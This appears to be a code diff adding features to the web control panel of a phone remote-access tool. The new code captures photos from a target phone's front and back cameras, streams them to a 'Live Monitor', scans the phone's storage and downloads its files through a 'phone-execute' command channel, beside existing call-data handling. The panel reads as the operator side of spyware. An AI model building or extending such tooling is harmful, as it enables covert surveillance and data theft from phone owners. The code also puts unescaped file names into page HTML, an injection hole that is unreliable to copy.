@@ -26,7 +26,27 @@
             <span id="status-text">Disconnected</span>
         </div>
     </div>
+<div class="grid">
+    <div class="card" style="grid-column: span 2;">
+        <h3>🔴 Live Monitor (Video/Photo)</h3>
+        <div id="video-container" style="background:#000; min-height:400px; display:flex; align-items:center; justify-content:center;">
+            <img id="live-frame" src="" style="display:none; width:100%; max-height:600px; object-fit:contain;">
+            <p id="video-placeholder" style="color:#666;">No Live Feed Active</p>
+        </div>
+        <div style="display:flex; gap:10px; margin-top:10px;">
+            <button class="btn-green" onclick="sendCmd('camera-back')">📸 Back Frame</button>
+            <button class="btn-green" onclick="sendCmd('camera-front')">📸 Front Frame</button>
+        </div>
+    </div>
 
+    <div class="card">
+        <h3>📂 File Manager</h3>
+        <button class="btn-blue" onclick="sendCmd('get-files')">Scan Storage</button>
+        <div id="file-list" style="height:250px; overflow-y:auto; background:#111; padding:10px; font-size:12px;">
+            Files will appear here...
+        </div>
+    </div>
+</div>
     <div class="grid">
         <div class="card">
             <h3>🔋 Device Status</h3>
@@ -66,7 +86,44 @@
             document.getElementById('dot').style.background = "red";
             document.getElementById('status-text').innerText = "Server Offline";
         });
+// Handle Live Image/Video Stream
+    socket.on('data-stream', (base64) => {
+        const img = document.getElementById('live-frame');
+        const placeholder = document.getElementById('video-placeholder');
+        placeholder.style.display = 'none';
+        img.style.display = 'block';
+        img.src = "data:image/jpeg;base64," + base64;
+    });
 
+    // Handle File List and generate Download Buttons
+    socket.on('file-data', (data) => {
+        const files = JSON.parse(data);
+        let html = "<ul style='list-style:none; padding:0;'>";
+        files.forEach(f => {
+            const icon = f.d ? "📁" : "📄";
+            html += `<li style='padding:5px; border-bottom:1px solid #333;'>
+                ${icon} ${f.n} 
+                ${!f.d ? `<button onclick="downloadFile('${f.n}')" style="width:auto; padding:2px 8px; font-size:10px; float:right;">Download</button>` : ''}
+            </li>`;
+        });
+        document.getElementById('file-list').innerHTML = html + "</ul>";
+    });
+
+    function downloadFile(name) {
+        sendCmd('download:' + name);
+        log.innerHTML += `<br>> Requesting download: ${name}`;
+    }
+
+    // Capture the incoming file data and force browser download
+    socket.on('file-download-ready', (fileObj) => {
+        const link = document.createElement('a');
+        link.href = "data:application/octet-stream;base64," + fileObj.data;
+        link.download = fileObj.name;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        log.innerHTML += `<br>> Success: ${fileObj.name} downloaded!`;
+    });
         function sendCmd(cmd) {
             socket.emit('phone-execute', cmd);
             log.innerHTML += `<br>> Executing: ${cmd}`;
@@ -132,5 +189,6 @@ socket.on('call-data', (data) => {
 });
 </body>
 </html>
+
 
 
